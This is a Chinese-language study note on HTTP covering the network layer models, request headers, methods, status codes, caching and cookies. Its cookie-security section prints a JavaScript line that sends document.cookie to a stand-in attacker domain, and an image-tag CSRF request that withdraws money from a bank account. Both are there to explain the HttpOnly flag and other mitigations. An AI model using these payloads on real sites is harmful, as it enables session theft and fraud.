# http

## 初识http

http （Hyper Text Transfer Protocol），超文本传输协议

首先它是用于**应用层**的协议，但是它可以在以任何**可靠的传输层**上使用。

先来认识OSI七层模型和TCP/IP四层模型

## OSI参考模型和TCP/IP模型

OSI（open system interconnetion）开放式系统互联参考模型

| OSI七层网络模型         | TCP/IP四层概念模型   |              对应网络协议               |
| :---------------------- | -------------------- | :-------------------------------------: |
| 应用层（Application）   | 合并成**应用层**     |    HTTP、TFTP、FTP、NFS、SMTP、WAIS     |
| 表示层（Presentation）  |                      |      Telnet、Rlogin、SNMP、Gopher       |
| 会话层（Session）       |                      |                SMTP、DNS                |
| 传输层（Transport）     | **传输层**           |                TCP、UDP                 |
| 网络层（network）       | **网络层**           |     IP、ICMP、ARP、RARP、AKP、UUCP      |
| 数据链路层（Data Link） | 合并成**数据链路层** | FDDI、Ethernet、Arpanet、PDN、SLIP、PPP |
| 物理层（Physical）      |                      |       IEEE 802.1A、IEEE 802.2~11        |

**补充**

数据包一台电脑到另一台电脑的过程：

**从上到下逐层封装，从下到上逐层解封**

## 请求

### 请求报文

​	请求报文结构如何？

| 组成结构 |                  包含内容                  |      |
| :------: | :----------------------------------------: | ---- |
|  请求行  |    请求方法、请求资源路径、http协议版本    |      |
|  请求头  | 对客户端环境的描述、客户端请求的主机地址等 |      |
|  请求体  |  客户端发给服务器的具体数据，比如文件数据  |      |

**请求行**例子

`GET /tools.html HTTP/1.1`

**请求头**例子

```
Host: www.joes-hardware.com   // 客户端想访问的服务器主机地址
User-Agent: Mozilla/4.75 (Win98; U) // 客户端的类型，客户端的软件环境
Accept: text/html, image/gif, image/jpeg   // 客户端所能接收的数据类型
Accept-Language: en   // 客户端的语言环境
Accept-Encoding: gzip   // 客户端支持的数据压缩格式
```



### 请求头

request headers

并非所有出现在请求中的http首部都属于请求头，比如在**post**请求中经常出现的**content-length**实际上是一个代表主体大小的**实体头**（entity header）

同时，**CORS**定义了一个叫做simple header的集合，它是请求头的一个子集。如果某次请求是只包含simple header的话，则被认为是**简单请求**，不会触发**请求预检**

举个请求头例子

```
GET /home.html HTTP/1.1
Host: developer.mozilla.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://developer.mozilla.org/testpage.html
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Mon, 18 Jul 2016 02:36:04 GMT
If-None-Match: "c561c68d0ba92bbeb8b0fff2a9199f722e3a621a"
Cache-Control: max-age=0
```

这个例子中的**字段**分别代表什么含义呢？

#### 请求首部字段

| 首部字段名          | 说明                                          |
| ------------------- | --------------------------------------------- |
| Accept              | 用户代理可处理的媒体类型                      |
| Accept-Charset      | 优先的字符集                                  |
| Accept-Encoding     | 优先的内容编码                                |
| Accept-Language     | 优先的语言（自然语言）                        |
| Authorization       | Web认证信息                                   |
| Expect              | 期待服务器的特定行为                          |
| From                | 用户的电子邮箱地址                            |
| Host                | 请求资源所在服务器                            |
| If-Match            | 比较实体标记（ETag）                          |
| If-Modified-Since   | 比较资源的更新时间                            |
| If-None-Match       | 比较实体标记（与 If-Macth 相反）              |
| If-Range            | 资源未更新时发送实体 Byte 的范围请求          |
| If-Unmodified-Since | 比较资源的更新时间(与 If-Modified-Since 相反) |
| Max-Forwards        | 最大传输逐跳数                                |
| Proxy-Authorization | 代理服务器要求客户端的认证信息                |
| Range               | 实体的字节范围请求                            |
| Referer             | 对请求中 URI 的原始获取方                     |
| TE                  | 传输编码的优先级                              |
| User-Agent          | HTTP 客户端程序的信                           |

可能你想问：怎么没有**Cache-Control**这个字段呢？

因为它属于通用**首部字段**

#### 通用首部字段

| 首部字段名        | 说明                       |
| :---------------- | :------------------------- |
| Cache-Control     | 控制缓存的行为             |
| Connection        | 逐挑首部、连接的管理       |
| Date              | 创建报文的日期时间         |
| Pragma            | 报文指令                   |
| Trailer           | 报文末端的首部一览         |
| Transfer-Encoding | 指定报文主体的传输编码方式 |
| Upgrade           | 升级为其他协议             |
| Via               | 代理服务器的相关信息       |
| Warning           | 错误通知                   |

### 请求方式

最常用2种

- get
- post

#### get

**?参数1&参数2**

由于**服务器和浏览器**对**URL长度有限制**，因此在URL后面附带的**参数是有限制的**，通常不能超过**1kb**

#### post

- 发送给服务器的**参数**全部放在**请求体**中
- 理论上，post传递的**数据量没有限制**（具体还得看**服务器处理能力**）

## 响应

### 状态码

http响应状态码用来表明特定http请求是否完成。分5大类：

- 信息响应（100~199）
- 成功响应（200~299）
- 重定向响应（300~399）
- 客户端错误响应（400~499）
- 服务端错误响应（500~599）

**常见状态及含义**

**1**

| 状态码 |                             含义                             |
| :----: | :----------------------------------------------------------: |
|  100   |     continue：服务器已收到请求的一部分，正在等待其余部分     |
|  101   | switching protocol：请求者已要求服务器切换协议，服务器一确认并准备切换 |

**2**

| 状态码  |                             含义                             |
| :-----: | :----------------------------------------------------------: |
| **200** |                  ok：服务器已成功处理了请求                  |
|   201   |        created：该请求已成功并且服务器创建了新的资源         |
|   202   |            accepted：服务器已接收请求，但尚未处理            |
|   203   | Non-Authoritative Information：服务器已成功处理了请求，但返回的信息可能来自另一个源 |
| **204** |     No Content：服务器成功处理了请求，但没有返回任何内容     |
|   205   | Reset Content：服务器成功处理了请求，告诉用户代理重置发送此请求的文档 ？？？？ |

**3**

| 状态码  |                             含义                             |
| :-----: | :----------------------------------------------------------: |
|   300   |       Multiple Choice：针对请求，服务器可执行多种操作        |
| **301** | Moved Permanently：请求的资源URL已永久更改，在响应中给出了新URL |
| **302** | Found：服务器目前从不同位置的网页响应请求，但这只是临时的（post变为get） |
|   303   | See Other：指示客户端通过一个GET请求在另一个URL中获取所请求的资源 |
| **304** | Not Modified：告诉客户端响应还没有被修改，因此客户端可以继续使用相同的缓存版本的响应 |
| **307** |     Temporary Redirect：与302有着相同含义，post不会变get     |

**4**

| 状态码  |                           含义                           |
| :-----: | :------------------------------------------------------: |
| **400** |  Bad Request：服务器不理解请求的语法（路径或语法错误）   |
| **401** | Unauthorized：需要身份认证，常用于登陆（合法用户的访问） |
| **403** | Forbidden：服务器拒绝请求，与401不同，这是非法用户的访问 |
| **404** | Not Found：找不到请求的资源，请求路径正确，但资源不存在  |
| **405** |   Method Not Allowed：禁用请求中指定的方法，比如delete   |
| **415** |         Unsupported media type：不支持的媒体类型         |

**5**

| 状态码  |                             含义                             |
| :-----: | :----------------------------------------------------------: |
| **500** |     Internal Server Error：服务器遇到错误，无法完成请求      |
|   501   |         Not Implemented：服务器不具备完成请求的方法          |
|   502   | Bad GateWay：服务器作为网关或代理，但从上游服务器得到错误响应 |
| **503** |  Service Unavailable：服务器目前无法使用（超载或停机维护）   |
|   504   | Gateway Timeout：服务器作为网关或代理，但是没有及时从上游服务器收到请求 |
|   505   | HTTP Version Not Supported：服务器不支持请求中使用的http版本 |

## 缓存

常见的http缓存只能缓存**get请求**响应的资源；

http缓存都是从**第2次请求**开始的；

第1次请求资源时，服务器返回资源，并在response header中回传资源的**缓存参数**；

第2次请求时，**浏览器**判断这些**请求参数**，命中**强缓存**就直接200(不发请求)，否则就把请求参数加到request header中传给**服务器**；

看是否命中**协商缓存**，命中则返回**304**，否则**服务器**返回**新的资源**；

## cookies

### 出现背景

HTTP 是**无状态**的：在同一个连接中，两个执行成功的请求之间是没有关系的;

```
比如在一个电商网站里，用户把某个商品加入到购物车，切换一个页面后再次添加了商品，这两次添加商品的请求之间没有关联，浏览器无法知道用户最终选择了哪些商品。
```

而使用 HTTP 的头部扩展，HTTP Cookies 就可以解决这个问题;

把**cookies添加到头部**中，创建一个会话让每次请求都能共享**相同上下文信息**，达成**相同的状态**；

Cookie 使基于**无状态**的 HTTP 协议**记录稳定的状态**信息成为了可能。

### 简介

Cookie是**服务器**发送到**用户浏览器**并保存在**本地**的一小块数据；

会在**浏览器**下次向**同一服务器**再发起**请求**时被携带并发送到服务器上；

通常，它用于告知**服务端** **两个请求**是否来自**同一浏览器**，如保持用户的**登录状态**。

### 应用

- 会话状态管理（用户登陆状态、购物车、游戏分数、或其它需要记录的信息）
- 个性化设置（用户自定义设置、主体等）
- 浏览器行为跟踪（跟踪分析用户行为等）

### 限制访问cookie

有两种方法可以确保cookie被安全发送，并且不会被意外的参与者或脚本访问：**Secure属性**和**HttpOnly属性**

不过，敏感信息不应该通过cookie传输（**明文传输**）；

**secure属性**可以预防man-in-the-middle攻击者的攻击，但是**可以访问客户端的人**可以读取它；

使用**HttpOnly属性**可防止通过**js**访问**cookie**值；

### 会话劫持和XXS

在web应用中，cookie常用来**标记用户**或**授权会话**；

因此，如果web应用的cookie**被窃取**，可能导致**用户的会话**收到攻击；

常用窃取cookie的方法有 **社会工程学** 和 **应用程序漏洞** 进行**xxs攻击**；

而设置了**HttpOnly属性**的cookie由于阻止了js对其的访问，而能在一定程度程度上缓解此类攻击；

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie
```



### 跨站请求伪造（CSRF）

例子：

在不安全的聊天室或论坛上的一张照片，它实际上是一个给你银行服务器发送体现的请求：

```
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开了这张图片的html页面时，如果你之前已经登陆了你的银行账号并且cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。。。

有一些方法可以阻止类似事件的发生：

- 对用户输入进行过滤来阻止XXS；
- 任何敏感操作都需要确认；
- 任何敏感信息的cookie只能拥有短暂的生命周期；

### 缺点

**浪费用户流量**

将cookie附加到每一次http请求中，有些请求可能**不需要携带**

**明文传输**

有一定安全风险

**大小限制**

4kb

**客户端兼容**

有些客户端不能自动添加cookie，还要手动设置

### 趋势

随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰；

服务器指定cookie后，浏览器每次请求都会携带cookie数据，会带来**额外的性能开销**（尤其在**移动环境**下）；

新的浏览器api已经允许开发者直接将数据**存储到本地**，如使用**web storage api**（本地存储和会话存储）或**indexedDB**；

